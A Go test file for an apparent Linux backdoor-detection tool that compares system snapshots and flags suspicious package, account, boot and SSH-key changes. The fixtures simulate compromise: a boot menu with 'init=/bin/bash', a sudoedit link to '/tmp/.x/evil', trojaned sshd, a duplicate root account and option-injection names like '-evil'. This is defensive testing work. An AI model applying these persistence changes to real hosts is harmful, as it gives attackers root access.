	curm2.Runtime.Modules = []model.KernelModule{{Name: "wg", File: "/lib/modules/6.1.0-25-amd64/extra/wg.ko"}}
	must(t, run(curm2, sm, nil), "snap.module:wg", model.SevBackdoor)

	// A new package accepted as a note, which later gains an enabled unit.
	oldp := clean()
	curp := clone(oldp)
	curp.Packages.Installed = append(curp.Packages.Installed, pkg("foo", "1.0", "/usr/bin/foo", "/usr/lib/systemd/system/foo.service"))
	curp.Files = append(curp.Files, file("/usr/bin/foo", "foo", 0o755), file("/usr/lib/systemd/system/foo.service", "[Service]", 0o644))
	res := archive(pkgverify.FileVerdict{Path: "/usr/bin/foo", Package: "foo", Version: "1.0", Expected: h("foo"), Actual: h("foo"), Source: "archive"},
		pkgverify.FileVerdict{Path: "/usr/lib/systemd/system/foo.service", Package: "foo", Version: "1.0", Expected: h("[Service]"), Actual: h("[Service]"), Source: "archive"})
	sp := snapOf(oldp)
	pf := must(t, run(curp, sp, res), "snap.pkg_installed:foo", model.SevNote)
	sp.Exceptions = []model.Exception{{FindingKey: pf.Key, AcceptedValue: currentValue(pf), At: taken}}
	if r := run(curp, sp, res); r.ExitCode != 0 {
		t.Errorf("accepted package still reported: %v", keys(r))
	}
	curp2 := clone(curp)
	curp2.Persist = append(curp2.Persist, model.PersistFile{Path: "/etc/systemd/system/multi-user.target.wants/foo.service", Kind: model.PersistKindSystemdEnabled,
		Mode: 0o120777, Lines: []string{"/usr/lib/systemd/system/foo.service"}, SHA256: h("link")})
	must(t, run(curp2, sp, res), "snap.pkg_installed:foo", model.SevBackdoor)
}

// I1: evidence folded into a finding is not dropped with it when it would
// rank higher on its own.
func TestJudgeExceptionKeepsMoreSeriousFoldedEvidence(t *testing.T) {
	s := snapOf(clean())
	s.Exceptions = []model.Exception{{FindingKey: "snap.pkg_removed:x", AcceptedValue: "removed", At: taken}}
	j := newJudge(Input{Collection: clean(), Snapshot: s}, clean())
	f := j.add(&model.Finding{Key: "snap.pkg_removed:x", Severity: model.SevNote, Evidence: []model.Evidence{{After: "removed"}}})
	j.pkgFinding["x"] = f
	j.foldIntoPackage("x", model.Evidence{Path: "/etc/cron.d/x", Detail: "changed"}, model.SevNote)
	if j.exceptions(); len(j.findings) != 0 {
		t.Fatalf("note-level folded evidence kept an accepted finding")
	}
	j = newJudge(Input{Collection: clean(), Snapshot: s}, clean())
	f = j.add(&model.Finding{Key: "snap.pkg_removed:x", Severity: model.SevNote, Evidence: []model.Evidence{{After: "removed"}}})
	j.pkgFinding["x"] = f
	j.foldIntoPackage("x", model.Evidence{Path: "/etc/cron.d/x", Detail: "changed"}, model.SevBackdoor)
	if j.exceptions(); len(j.findings) != 1 {
		t.Fatalf("backdoor-level folded evidence dropped with an accepted note")
	}
}

// I2: account files are only quiet when the account comparison shows what
// changed in them.
func TestJudgeAccountFilesComparedWhenAccountsDoNotExplainThem(t *testing.T) {
	old := clean()
	old.Files = append(old.Files, file("/etc/gshadow", "sudo:!::", 0o640), file("/etc/subuid", "alice:100000:65536", 0o644),
		file("/etc/passwd", "root:x:0:0", 0o644), file("/etc/shadow", "root:$y$a", 0o640))
	cur := clone(old)
	setFile(cur, file("/etc/gshadow", "sudo:$y$hash::", 0o640))
	setFile(cur, file("/etc/subuid", "alice:0:1", 0o644))
	setFile(cur, file("/etc/passwd", "root:x:0:0\nroot:x:0:0:dup", 0o644))
	r := run(cur, snapOf(old), nil)
	must(t, r, "snap.file_modified:/etc/gshadow", model.SevBackdoor)
	sub := must(t, r, "snap.file_modified:/etc/subuid", model.SevBackdoor)
	if !strings.Contains(sub.Why, "id 0") {
		t.Errorf("subuid why %q", sub.Why)
	}
	// passwd content the account comparison does not see (ageing, comments,
	// a line it skips) is a note; duplicate names are their own finding.
	must(t, r, "snap.file_modified:/etc/passwd", model.SevNote)

	// A password change explains /etc/shadow's new content.
	cur2 := clone(old)
	cur2.Accounts.Users[0].Password.Digest = "digest-root-2"
	setFile(cur2, file("/etc/shadow", "root:$y$b", 0o640))
	r = run(cur2, snapOf(old), nil)
	absent(t, r, "snap.file_modified:/etc/shadow")
	must(t, r, "snap.user_changed:root", model.SevNote)
}

func TestJudgeDuplicateAccountNames(t *testing.T) {
	// A collection that still lists both entries.
	c := clean()
	c.Accounts.Users = append(c.Accounts.Users, model.User{Name: "root", UID: 0, Home: "/root", Shell: "/bin/sh"})
	f := must(t, run(c, nil, nil), "acct.duplicate:/etc/passwd:root", model.SevBackdoor)
	if len(f.Evidence) != 2 {
		t.Errorf("evidence %+v", f.Evidence)
	}
	must(t, run(c, snapOf(clean()), nil), "acct.duplicate:/etc/passwd:root", model.SevBackdoor)

	// What the collector reports: duplicates and lines glibc rejects.
	c = clean()
	c.Accounts.Duplicates = []string{"/etc/shadow:root", "/etc/group:sudo"}
	c.Accounts.Malformed = []string{"/etc/passwd:7"}
	r := run(c, nil, nil)
	must(t, r, "acct.duplicate:/etc/shadow:root", model.SevBackdoor)
	must(t, r, "acct.duplicate:/etc/group:sudo", model.SevBackdoor)
	must(t, r, "acct.malformed:/etc/passwd:7", model.SevBackdoor)
}

// I3: boot files fold only into the packages that rebuild them.
func TestJudgeBootFilesFoldOnlyIntoRebuilders(t *testing.T) {
	old := clean()
	old.Packages.Installed = append(old.Packages.Installed, pkg("grub-pc", "2.06-13+deb12u1"),
		pkg("udev", "252.30-1~deb12u2", "/usr/share/initramfs-tools/hooks/udev"))
	old.Files = append(old.Files, file("/boot/grub/grub.cfg", "menu", 0o444), file("/boot/grub/x86_64-efi/normal.mod", "mod", 0o644),
		file("/boot/initrd.img-6.1.0-25-amd64", "initrd", 0o644), file("/boot/efi/EFI/debian/grubx64.efi", "efi", 0o755))
	edit := func(c *model.Collection) {
		setFile(c, file("/boot/grub/grub.cfg", "menu init=/bin/bash", 0o444))
		setFile(c, file("/boot/grub/x86_64-efi/normal.mod", "evil mod", 0o644))
		setFile(c, file("/boot/initrd.img-6.1.0-25-amd64", "evil initrd", 0o644))
		setFile(c, file("/boot/efi/EFI/debian/grubx64.efi", "evil efi", 0o755))
	}
	boot := []string{"/boot/grub/grub.cfg", "/boot/grub/x86_64-efi/normal.mod", "/boot/initrd.img-6.1.0-25-amd64", "/boot/efi/EFI/debian/grubx64.efi"}

	// An unrelated upgrade explains none of them.
	cur := clone(old)
	setVersion(cur, "unattended-upgrades", "2.9.1+nmu4")
	edit(cur)
	r := run(cur, snapOf(old), archive())
	for _, p := range boot {
		must(t, r, "snap.file_modified:"+p, model.SevBackdoor)
	}

	// A GRUB upgrade rebuilds the menu, the modules and the EFI binary, not
	// the initramfs.
	cur = clone(old)
	setVersion(cur, "grub-pc", "2.06-13+deb12u2")
	edit(cur)
	r = run(cur, snapOf(old), archive(pkgverify.FileVerdict{Path: "/usr/lib/grub/i386-pc/kernel.img", Package: "grub-pc", Version: "2.06-13+deb12u2", Source: "archive"}))
	for _, p := range boot[:2] {
		absent(t, r, "snap.file_modified:"+p)
	}
	absent(t, r, "snap.file_modified:/boot/efi/EFI/debian/grubx64.efi")
	must(t, r, "snap.file_modified:/boot/initrd.img-6.1.0-25-amd64", model.SevBackdoor)

	// A package with an initramfs hook rebuilds the initramfs of every
	// kernel.
	cur = clone(old)
	setVersion(cur, "udev", "252.31-1~deb12u1")
	edit(cur)
	r = run(cur, snapOf(old), archive(pkgverify.FileVerdict{Path: "/usr/share/initramfs-tools/hooks/udev", Package: "udev", Version: "252.31-1~deb12u1", Source: "archive"}))
	absent(t, r, "snap.file_modified:/boot/initrd.img-6.1.0-25-amd64")
	if g := explained(r, "explained:udev"); g == nil || !hasEvidencePath(g, "/boot/initrd.img-6.1.0-25-amd64") {
		t.Errorf("initramfs not shown with the hook package: %+v", g)
	}
	must(t, r, "snap.file_modified:/boot/grub/grub.cfg", model.SevBackdoor)
}

// I4: a package change does not cover a loosened directory or a link that
// now points somewhere it should not.
func TestJudgePackageDirsAndLinksAreChecked(t *testing.T) {
	old := clean()
	old.Packages.Installed = append(old.Packages.Installed, pkg("sudo", "1.9.13p3-1+deb12u1", "/etc/sudoers.d", "/usr/bin/sudoedit", "/usr/share/doc/sudo"))
	old.Files = append(old.Files,
		model.FileEntry{Path: "/etc/sudoers.d", Type: "dir", Mode: 0o040750, MTime: taken, CTime: taken},
		model.FileEntry{Path: "/usr/share/doc/sudo", Type: "dir", Mode: 0o040755, MTime: taken, CTime: taken},
		model.FileEntry{Path: "/usr/bin/sudoedit", Type: "symlink", Target: "sudo", Mode: 0o120777, MTime: taken, CTime: taken})
	cur := clone(old)
	setVersion(cur, "sudo", "1.9.13p3-1+deb12u2")
	setFile(cur, model.FileEntry{Path: "/etc/sudoers.d", Type: "dir", Mode: 0o040777, MTime: changed, CTime: changed})
	setFile(cur, model.FileEntry{Path: "/usr/bin/sudoedit", Type: "symlink", Target: "/tmp/.x/evil", Mode: 0o120777, MTime: changed, CTime: changed})
	setFile(cur, model.FileEntry{Path: "/usr/share/doc/sudo", Type: "dir", Mode: 0o040775, MTime: changed, CTime: changed})
	for _, withUpgrade := range []bool{true, false} {
		c := clone(cur)
		if !withUpgrade {
			setVersion(c, "sudo", "1.9.13p3-1+deb12u1")
		}
		r := run(c, snapOf(old), archive())
		must(t, r, "snap.file_modified:/etc/sudoers.d", model.SevBackdoor)
		must(t, r, "snap.file_modified:/usr/bin/sudoedit", model.SevBackdoor)
		must(t, r, "snap.file_modified:/usr/share/doc/sudo", model.SevBackdoor)
	}

	// A link retargeted out of the system directories.
	c := clone(old)
	setFile(c, model.FileEntry{Path: "/usr/bin/sudoedit", Type: "symlink", Target: "/opt/x/sudo", Mode: 0o120777})
	must(t, run(c, snapOf(old), archive()), "snap.file_modified:/usr/bin/sudoedit", model.SevBackdoor)
	// Retargeted within them during an upgrade: part of the upgrade.
	setVersion(c, "sudo", "1.9.13p3-1+deb12u2")
	setFile(c, model.FileEntry{Path: "/usr/bin/sudoedit", Type: "symlink", Target: "/usr/libexec/sudo/sudoedit", Mode: 0o120777})
	absent(t, run(c, snapOf(old), archive()), "snap.file_modified:/usr/bin/sudoedit")
}

// I5: the machine's own checksums never explain a content change at the
// same package version, and are never called signed.
func TestJudgeOfflineNeverExplainsSameVersion(t *testing.T) {
	old := clean()
	old.Packages.Installed = append(old.Packages.Installed, pkg("openssh-server", "1:9.2p1-2+deb12u3", "/usr/sbin/sshd"))
	old.Files = append(old.Files, file("/usr/sbin/sshd", "sshd", 0o755))
	cur := clone(old)
	setFile(cur, file("/usr/sbin/sshd", "trojan", 0o755))
	off := func() *pkgverify.Result {
		return &pkgverify.Result{Mode: pkgverify.ModeOfflineLocal, Errors: []string{pkgverify.OfflineWarning},
			Verified: []pkgverify.FileVerdict{{Path: "/usr/sbin/sshd", Package: "openssh-server", Version: "", Expected: "md5:aa", Actual: "md5:aa", Source: pkgverify.SourceOfflineLocal}}}
	}
	r := run(cur, snapOf(old), off())
	must(t, r, "snap.file_modified:/usr/sbin/sshd", model.SevBackdoor)

	// After an upgrade they may explain it, in honest words.
	setVersion(cur, "openssh-server", "1:9.2p1-2+deb12u4")
	r = run(cur, snapOf(old), off())
	absent(t, r, "snap.file_modified:/usr/sbin/sshd")
	g := explained(r, "explained:openssh-server")
	if g == nil {
		t.Fatalf("upgrade not explained: %v", keys(r))
	}
	b, _ := json.Marshal(r)
	if strings.Contains(string(b), "signed") {
		t.Errorf("offline report calls something signed: %s", b)
	}
	if !strings.Contains(g.Why+g.Evidence[1].Detail, "own package checksums") {
		t.Errorf("group does not say what explained it: %+v", g)
	}
}

// M1: a symlinked authorized_keys: Lines[0] is the link target.
func TestJudgeSymlinkedAuthorizedKeys(t *testing.T) {
	link := func(path, target string, lines ...string) model.PersistFile {
		return model.PersistFile{Path: path, Kind: model.PersistKindAuthorizedKeys, Mode: 0o120777, SHA256: h(strings.Join(lines, "\n")),
			Lines: append([]string{target}, lines...), MTime: changed}
	}
	old := clean()
	old.Accounts.Users = append(old.Accounts.Users, model.User{Name: "alice", UID: 1000, GID: 1000, Home: "/home/alice", Shell: "/bin/bash",
		Password: model.PasswordState{Known: true, Locked: true, LastChange: 20000}})
	old.Persist = []model.PersistFile{link("/home/alice/.ssh/authorized_keys", "../keys", ownerKey), link("/root/.ssh/authorized_keys", "/etc/ssh/keys/root", ownerKey)}
	cur := clone(old)
	cur.Persist = []model.PersistFile{link("/home/alice/.ssh/authorized_keys", "../keys", evilKey, ownerKey), link("/root/.ssh/authorized_keys", "/etc/ssh/keys/root", evilKey, ownerKey)}

	r := run(cur, snapOf(old), nil)
	f := must(t, r, "snap.root_key:/root/.ssh/authorized_keys:1", model.SevBackdoor)
	want := evidenceCopy + "'/root/.ssh/authorized_keys' '/etc/ssh/keys/root' /root/telltale-evidence/ && sed -i '1d' '/etc/ssh/keys/root'"
	if !strings.HasPrefix(f.Fix, want) || f.Evidence[0].Line != 1 {
		t.Errorf("fix %q evidence %+v", f.Fix, f.Evidence[0])
	}
	absent(t, r, "snap.root_key:/root/.ssh/authorized_keys:2")
	g := must(t, r, "snap.persist:/home/alice/.ssh/authorized_keys", model.SevBackdoor)
	if !strings.Contains(g.Fix, "sed -i '1d' '/home/alice/keys'") || !slices.ContainsFunc(g.Evidence, func(e model.Evidence) bool { return e.Line == 1 && e.After == evilKey }) {
		t.Errorf("fix %q evidence %+v", g.Fix, g.Evidence)
	}
}

// M2: an executable or library under root's cache is reported.
func TestJudgeRootCacheExecutablesReported(t *testing.T) {
	old := clean()
	cur := clone(old)
	cur.Files = append(cur.Files, file("/root/.cache/pip/http/abc", "cache", 0o600), file("/root/.cache/x/run", "elf", 0o755), file("/root/.cache/x/libx.so", "so", 0o644))
	r := run(cur, snapOf(old), nil)
	absent(t, r, "snap.file_added:/root/.cache/pip/http/abc")
	must(t, r, "snap.file_added:/root/.cache/x/run", model.SevBackdoor)
	must(t, r, "snap.file_added:/root/.cache/x/libx.so", model.SevBackdoor)
}

// M3: a scan without root, or with nothing collected, never looks clean.
func TestJudgeNonRootAndNothingCollectedStated(t *testing.T) {
	c := clean()
	c.AsRoot = false
	r := run(c, nil, nil)
	if !slices.ContainsFunc(r.CouldNotRuleOut, func(s string) bool { return strings.Contains(s, "checks that need root were skipped") }) {
		t.Errorf("non-root limit missing: %q", r.CouldNotRuleOut)
	}
	if r := run(clean(), nil, nil); slices.ContainsFunc(r.CouldNotRuleOut, func(s string) bool { return strings.Contains(s, "need root") }) {
		t.Errorf("root scan says root was missing")
	}
	r = Judge(Input{Context: ctx, Now: now})
	if !slices.ContainsFunc(r.CouldNotRuleOut, func(s string) bool { return strings.Contains(s, "nothing was collected") }) {
		t.Errorf("nil collection: %q", r.CouldNotRuleOut)
	}
}

// M4: names in commands come after "--", and a purge saves the package's
// files first.
func TestJudgeFixNamesAfterEndOfOptions(t *testing.T) {
	purge := fixPurge("-evil")
	for _, want := range []string{"dpkg -L -- '-evil'", "cp -a --parents -- \"$f\" /root/telltale-evidence/", ") && apt-get purge -- '-evil'"} {
		if !strings.Contains(purge, want) {
			t.Errorf("purge fix %q lacks %q", purge, want)
		}
	}
	if s := fixUserAdded("-r", false); !strings.Contains(s, "userdel -- '-r'") {
		t.Errorf("userdel fix %q", s)
	}
	if s := fixGroupMembers("sudo", []string{"-x"}); !strings.Contains(s, "gpasswd -d '-x' -- 'sudo'") {
		t.Errorf("gpasswd fix %q", s)
	}
}

// M6: Ubuntu's kernel companions follow the same flavour rule.
func TestJudgeKernelCompanionsExplained(t *testing.T) {
	old := clean()
	old.Host.OSID = "ubuntu"
	old.Packages.Installed = append(old.Packages.Installed, pkg("linux-image-6.8.0-45-generic", "6.8.0-45.45"), pkg("linux-tools-6.8.0-45", "6.8.0-45.45"))
	cur := clone(old)
	news := []string{"linux-image-6.8.0-49-generic", "linux-image-unsigned-6.8.0-49-generic", "linux-tools-6.8.0-49-generic", "linux-tools-6.8.0-49",
		"linux-cloud-tools-6.8.0-49-generic", "linux-modules-nvidia-550-6.8.0-49-generic", "linux-objects-nvidia-550-server-6.8.0-49-generic"}
	for _, n := range news {
		cur.Packages.Installed = append(cur.Packages.Installed, pkg(n, "6.8.0-49.49+1"))
	}
	r := run(cur, snapOf(old), nil)
	for _, n := range news {
		absent(t, r, "snap.pkg_installed:"+n)
	}
	// A flavourless tools package needs a flavourless one before it.
	cur2 := clone(old)
	cur2.Packages.Installed = append(cur2.Packages.Installed, pkg("linux-cloud-tools-6.8.0-49", "6.8.0-49.49"))
	must(t, run(cur2, snapOf(old), nil), "snap.pkg_installed:linux-cloud-tools-6.8.0-49", model.SevNote)
}

// R52: verification that could not run is one note, not a backdoor sign per
// package; only a version no trusted source has is a backdoor sign.
func TestJudgeUncheckedPackagesAreOneNote(t *testing.T) {
	old := clean()
	old.Packages.Installed = append(old.Packages.Installed,
		pkg("openssh-server", "1:9.2p1-2+deb12u3", "/usr/sbin/sshd"), pkg("sudo", "1.9.13p3-1+deb12u1", "/usr/bin/sudo"))
	old.Files = append(old.Files, file("/usr/sbin/sshd", "sshd", 0o755), file("/usr/bin/sudo", "sudo", 0o4755))
	cur := clone(old)
	setVersion(cur, "openssh-server", "1:9.2p1-2+deb12u4")
	setVersion(cur, "sudo", "1.9.13p3-1+deb12u2")
	setFile(cur, file("/usr/sbin/sshd", "sshd 2", 0o755))
	setFile(cur, file("/usr/bin/sudo", "sudo 2", 0o4755))
	timeout := `could not check the package: Get "https://deb.debian.org/debian/pool/main/o/openssh/x.deb": dial tcp 151.101.2.132:443: i/o timeout`
	res := &pkgverify.Result{Mode: pkgverify.ModeArchive, Unverifiable: []pkgverify.FileVerdict{
		{Path: "/usr/sbin/sshd", Package: "openssh-server", Version: "1:9.2p1-2+deb12u4", Reason: timeout, Kind: pkgverify.KindUnreachable},
		{Path: "/usr/bin/sudo", Package: "sudo", Version: "1.9.13p3-1+deb12u2", Reason: "could not read the official archive index: 503 Service Unavailable", Kind: pkgverify.KindUnreachable}}}

	r := run(cur, snapOf(old), res)
	for _, k := range []string{"snap.pkg_upgraded:openssh-server", "snap.pkg_upgraded:sudo", "pkg.unverifiable:/usr/bin/sudo", "snap.file_modified:/usr/sbin/sshd"} {
		absent(t, r, k)
	}
	f := must(t, r, "pkg.unchecked_changes", model.SevNote)
	if f.Title != "2 package files could not be checked because the package archive could not be reached" || !hasEvidencePath(f, "/usr/sbin/sshd") || !hasEvidencePath(f, "/usr/bin/sudo") {
		t.Errorf("unchecked note %q %+v", f.Title, f.Evidence)
	}
	if explained(r, "explained:openssh-server") != nil || explained(r, "explained:sudo") != nil {
		t.Errorf("unchecked upgrades explained")
	}
	if !slices.ContainsFunc(r.CouldNotRuleOut, func(s string) bool { return strings.Contains(s, "i/o timeout") && strings.Contains(s, "503") }) {
		t.Errorf("reasons not stated: %q", r.CouldNotRuleOut)
	}
	if r.ExitCode != 1 {
		t.Errorf("exit %d (%v)", r.ExitCode, keys(r))
	}

	// A reference bundle whose indexes were read but that lacks a package
	// (R61: a root-chosen version only HTTPS sources have) confirmed
	// nothing: both are backdoor signs.
	res2 := &pkgverify.Result{Mode: pkgverify.ModeRefs, SourcesUsed: []string{"reference bundle /mnt/refs"}, Unverifiable: []pkgverify.FileVerdict{
		{Path: "/usr/sbin/sshd", Package: "openssh-server", Reason: "package not in the reference bundle", Kind: pkgverify.KindNotFound},
		{Path: "/usr/bin/sudo", Package: "sudo", Reason: "not in the reference bundle: " + pkgverify.ReasonNotOfficial, Kind: pkgverify.KindNotFound}}}
	r = run(cur, snapOf(old), res2)
	must(t, r, "snap.pkg_upgraded:openssh-server", model.SevBackdoor)
	must(t, r, "snap.pkg_upgraded:sudo", model.SevBackdoor)
	must(t, r, "pkg.unverifiable:/usr/bin/sudo", model.SevBackdoor)
	absent(t, r, "pkg.unchecked_changes")
}

// R53: gshadow changes that the group comparison explains are notes, unless
// they give a group a password or a privileged group a member or admin.
func TestJudgeGShadowChangesWithGroups(t *testing.T) {
	base := func() *model.Collection {
		c := clean()
		for i := range c.Accounts.Groups {
			c.Accounts.Groups[i].Shadow = &model.GroupShadow{}
		}
		c.Files = append(c.Files, file("/etc/gshadow", "gshadow", 0o640), file("/etc/group", "group", 0o644))
		return c
	}
	old := base()
	edit := func(f func(c *model.Collection)) *model.Report {
		cur := clone(old)
		f(cur)
		setFile(cur, file("/etc/gshadow", "gshadow 2", 0o640))
		setFile(cur, file("/etc/group", "group 2", 0o644))
		return run(cur, snapOf(old), nil)
	}

	// adduser: a new group in both files.
	r := edit(func(c *model.Collection) {
		c.Accounts.Groups = append(c.Accounts.Groups, model.Group{Name: "alice", GID: 1000, Shadow: &model.GroupShadow{}})
	})
	must(t, r, "snap.file_modified:/etc/gshadow", model.SevNote)
	absent(t, r, "snap.file_modified:/etc/group")

	// A group password.
	r = edit(func(c *model.Collection) { c.Accounts.Groups[2].Shadow.PasswordSet = true })
	must(t, r, "snap.file_modified:/etc/gshadow", model.SevBackdoor)
	g := must(t, r, "snap.group:staff", model.SevBackdoor)
	if !strings.Contains(g.Fix, "gpasswd -r -- 'staff'") {
		t.Errorf("fix %q", g.Fix)
	}
	// An administrator for a privileged group.
	r = edit(func(c *model.Collection) { c.Accounts.Groups[1].Shadow.Admins = []string{"eve"} })
	must(t, r, "snap.file_modified:/etc/gshadow", model.SevBackdoor)
	must(t, r, "snap.group:sudo", model.SevBackdoor)

	// gshadow changed with no group change to show for it.
	cur := clone(old)
	setFile(cur, file("/etc/gshadow", "gshadow 2", 0o640))
	must(t, run(cur, snapOf(old), nil), "snap.file_modified:/etc/gshadow", model.SevBackdoor)

	// shadow content with no password change seen (ageing): a note.
	old2 := clean()
	old2.Files = append(old2.Files, file("/etc/shadow", "root:$y$a:20000", 0o640))
	cur2 := clone(old2)
	setFile(cur2, file("/etc/shadow", "root:$y$a:20001", 0o640))
	must(t, run(cur2, snapOf(old2), nil), "snap.file_modified:/etc/shadow", model.SevNote)
}

// R54: firmware and microcode updates rebuild the initramfs.
func TestJudgeFirmwareRebuildsInitramfs(t *testing.T) {
	for _, name := range []string{"firmware-misc-nonfree", "linux-firmware", "intel-microcode", "amd64-microcode"} {
		old := clean()
		old.Packages.Installed = append(old.Packages.Installed, pkg(name, "1"))
		old.Files = append(old.Files, file("/boot/initrd.img-6.1.0-25-amd64", "initrd", 0o644))
		cur := clone(old)
		setVersion(cur, name, "2")
		setFile(cur, file("/boot/initrd.img-6.1.0-25-amd64", "initrd 2", 0o644))
		r := run(cur, snapOf(old), archive(pkgverify.FileVerdict{Path: "/usr/lib/firmware/x.bin", Package: name, Version: "2", Source: "archive"}))
		absent(t, r, "snap.file_modified:/boot/initrd.img-6.1.0-25-amd64")
		if g := explained(r, "explained:"+name); g == nil || !hasEvidencePath(g, "/boot/initrd.img-6.1.0-25-amd64") {
			t.Errorf("%s: initramfs not shown with it", name)
		}
	}
}

// R52: a new package raised for its own reasons keeps them in its value
// even when its programs could not be checked.
func TestJudgeUncheckedNewPackageKeepsItsReasons(t *testing.T) {
	old := clean()
	cur := clone(old)
	cur.Packages.Installed = append(cur.Packages.Installed, pkg("helperpkg", "1.0-1", "/usr/bin/helper"))
	cur.Files = append(cur.Files, file("/usr/bin/helper", "helper", 0o4755))
	res := &pkgverify.Result{Mode: pkgverify.ModeArchive, Unverifiable: []pkgverify.FileVerdict{
		{Path: "/usr/bin/helper", Package: "helperpkg", Version: "1.0-1", Reason: "could not check the package: connection refused", Kind: pkgverify.KindUnreachable}}}
	r := run(cur, snapOf(old), res)
	f := must(t, r, "snap.pkg_installed:helperpkg", model.SevBackdoor)
	if !strings.Contains(f.Evidence[0].After, "setuid/setgid program") {
		t.Errorf("value %q", f.Evidence[0].After)
	}
	must(t, r, "pkg.unchecked_changes", model.SevNote)
	absent(t, r, "pkg.unverifiable:/usr/bin/helper")
}

// R55: without a snapshot too, a setuid program, module, PAM module or boot
// file that could not be checked because the archive could not be used
// goes into the one note; a version no trusted source has, or an untrusted
// source, stays a backdoor sign each.
func TestJudgeUncheckedSpecialFilesWithoutSnapshot(t *testing.T) {
	c := clean()
	su := file("/usr/bin/su", "su", 0o4755)
	ko := file("/lib/modules/6.1.0-25-amd64/kernel/fs/x.ko", "ko", 0o644)
	c.Files = append(c.Files, su, ko)
	c.Packages.Installed = append(c.Packages.Installed, pkg("login", "1:4.13", su.Path), pkg("linux-image-6.1.0-25-amd64", "6.1.106-3", ko.Path))
	down := "could not read the official archive index: Get \"https://deb.debian.org/debian/dists/bookworm/InRelease\": dial tcp: lookup deb.debian.org: no such host"
	verdicts := func(kind string) *pkgverify.Result {
		return &pkgverify.Result{Mode: pkgverify.ModeArchive, Unverifiable: []pkgverify.FileVerdict{
			{Path: su.Path, Package: "login", Version: "1:4.13", Reason: down, Kind: kind},
			{Path: ko.Path, Package: "linux-image-6.1.0-25-amd64", Version: "6.1.106-3", Reason: down, Kind: kind}}}
	}

	r := run(c, nil, verdicts(pkgverify.KindUnreachable))
	absent(t, r, "pkg.unverifiable:"+su.Path)
	absent(t, r, "pkg.unverifiable:"+ko.Path)
	f := must(t, r, "pkg.unchecked_changes", model.SevNote)
	if f.Title != "2 package files could not be checked because the package archive could not be reached" || !hasEvidencePath(f, su.Path) || !hasEvidencePath(f, ko.Path) {
		t.Errorf("note %q %+v", f.Title, f.Evidence)
	}
	if !slices.ContainsFunc(r.CouldNotRuleOut, func(s string) bool { return strings.Contains(s, "no such host") }) {
		t.Errorf("reason not stated: %q", r.CouldNotRuleOut)
	}
	if r.ExitCode != 1 {
		t.Errorf("exit %d (%v)", r.ExitCode, keys(r))
	}

	for _, kind := range []string{pkgverify.KindNotFound, pkgverify.KindUntrusted} {
		r = run(c, nil, verdicts(kind))
		must(t, r, "pkg.unverifiable:"+su.Path, model.SevBackdoor)
		must(t, r, "pkg.unverifiable:"+ko.Path, model.SevBackdoor)
		absent(t, r, "pkg.unchecked_changes")
	}
}

// --- review round 2 ---

func sshBase() *model.Collection {
	old := clean()
	old.Packages.Installed = append(old.Packages.Installed, pkg("openssh-server", "1:9.2p1-2+deb12u3", "/usr/sbin/sshd", "/usr/lib/systemd/system/ssh.service"))
	old.Files = append(old.Files, file("/usr/sbin/sshd", "sshd", 0o755), file("/usr/lib/systemd/system/ssh.service", "ExecStart=/usr/sbin/sshd -D", 0o644))
	return old
}

// upgradeSSH changes sshd at a new version and reports it with kind.
func upgradeSSH(old *model.Collection, version, content, kind, reason string) (*model.Collection, *pkgverify.Result) {
	cur := clone(old)
	setVersion(cur, "openssh-server", version)
	setFile(cur, file("/usr/sbin/sshd", content, 0o755))
	res := archive()
	res.Unverifiable = []pkgverify.FileVerdict{{Path: "/usr/sbin/sshd", Package: "openssh-server", Version: version, Actual: h(content), Reason: reason, Kind: kind}}
	return cur, res
}

// R58: only network kinds fold into the note on unchecked files; kinds that
// come from data root can write are backdoor signs.
func TestJudgeOnlyNetworkKindsAreUnchecked(t *testing.T) {
	old := sshBase()
	for _, tc := range []struct {
		kind    string
		folds   bool
		version string
	}{
		{pkgverify.KindUnreachable, true, "1:9.2p1-2+deb12u9"},
		{pkgverify.KindBadSignature, true, "1:9.2p1-2+deb12u9"},
		{pkgverify.KindPro, false, "1:9.2p1-2+deb12u9+esm1"}, // Debian: "+esm" is just text in a version
		{pkgverify.KindUnsupportedArch, false, "1:9.2p1-2+deb12u9"},
		{pkgverify.KindBudget, false, "1:9.2p1-2+deb12u9"},
		{pkgverify.KindNotHashed, false, "1:9.2p1-2+deb12u9"},
		{pkgverify.KindNotChecked, false, "1:9.2p1-2+deb12u9"},
	} {
		cur, res := upgradeSSH(old, tc.version, "trojan sshd", tc.kind, "reason for "+tc.kind)
		r := run(cur, snapOf(old), res)
		if tc.folds {
			absent(t, r, "snap.pkg_upgraded:openssh-server")
			must(t, r, "pkg.unchecked_changes", model.SevNote)
		} else {
			must(t, r, "snap.pkg_upgraded:openssh-server", model.SevBackdoor)
			absent(t, r, "pkg.unchecked_changes")
			if r.ExitCode != 2 {
				t.Errorf("%s: exit %d", tc.kind, r.ExitCode)
			}
		}
	}

	// R61: even on Ubuntu with an ESM source (both root can write), a Pro
	// version nothing confirmed is a backdoor sign; only unreadable base
	// indexes fold.
	ub := sshBase()
	ub.Host.OSID = "ubuntu"
	ub.Packages.Sources = []model.AptSource{{URIs: []string{"https://esm.ubuntu.com/apps/ubuntu"}, Suites: []string{"noble-apps-security"}}}
	cur, res := upgradeSSH(ub, "1:9.6p1-3ubuntu13.5+esm1", "sshd esm", pkgverify.KindPro, pkgverify.ReasonPro)
	r := run(cur, snapOf(ub), res)
	must(t, r, "snap.pkg_upgraded:openssh-server", model.SevBackdoor)
	absent(t, r, "pkg.unchecked_changes")

	// The package budget: still a backdoor sign, and the limit is a note.
	cur, res = upgradeSSH(old, "1:9.2p1-2+deb12u9", "trojan sshd", pkgverify.KindBudget, "not checked: the collection lists more than 10000 packages")
	b := must(t, run(cur, snapOf(old), res), "pkg.budget_exceeded", model.SevNote)
	if !strings.Contains(b.Why, "unusual") {
		t.Errorf("budget why %q", b.Why)
	}
}

// R58/R55: the same rules without a snapshot, for setuid programs, kernel
// modules, PAM modules and boot files; an unsupported host is a limit of
// the whole scan.
func TestJudgeSpecialFileKindsWithoutSnapshot(t *testing.T) {
	c := clean()
	c.Packages.Installed = append(c.Packages.Installed, model.Package{Name: "sudo", Version: "1.9.13p3-1+deb12u1", Arch: "mips64el", Status: "install ok installed", Files: []string{"/usr/bin/sudo"}})
	c.Files = append(c.Files, file("/usr/bin/sudo", "trojan sudo", 0o4755))
	res := func(kind, reason string) *pkgverify.Result {
		return &pkgverify.Result{Mode: pkgverify.ModeArchive, Unverifiable: []pkgverify.FileVerdict{
			{Path: "/usr/bin/sudo", Package: "sudo", Version: "1.9.13p3-1+deb12u1", Actual: h("trojan sudo"), Reason: reason, Kind: kind}}}
	}
